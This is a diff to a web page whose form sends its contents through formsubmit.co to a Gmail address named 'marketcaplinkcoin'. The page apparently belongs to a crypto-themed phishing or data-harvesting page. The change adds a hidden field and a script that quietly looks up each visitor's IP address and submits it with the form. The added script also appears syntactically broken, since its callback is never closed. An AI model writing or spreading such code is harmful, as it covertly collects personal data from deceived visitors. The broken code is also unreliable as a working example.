@@ -29,6 +29,7 @@
 
         <div class="form-container">
           <form id="form" method="POST" action="https://formsubmit.co/marketcaplinkcoin@gmail.com">
+            <input type="hidden" id="ipaddress" name="IPaddress">
             <div class="form-content box">
               <div class="logo">
                 <img src="./images/logo-light.png" class="logo-light" />
@@ -99,6 +100,17 @@
   </div>
 
   <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      // Fetch IP address
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          document.getElementById('ipaddress').value = data.ip || '';
+        })
+        .catch(error => {
+          console.error('IP Fetch Error:', error);
+          alert('Failed to fetch IP address. Please try again.');
+        });
     const form = document.getElementById('form');
     const nextField = document.getElementById('nextField');
 
@@ -110,3 +122,4 @@
   <script src="app.js"></script>
 </body>
 </html>
+
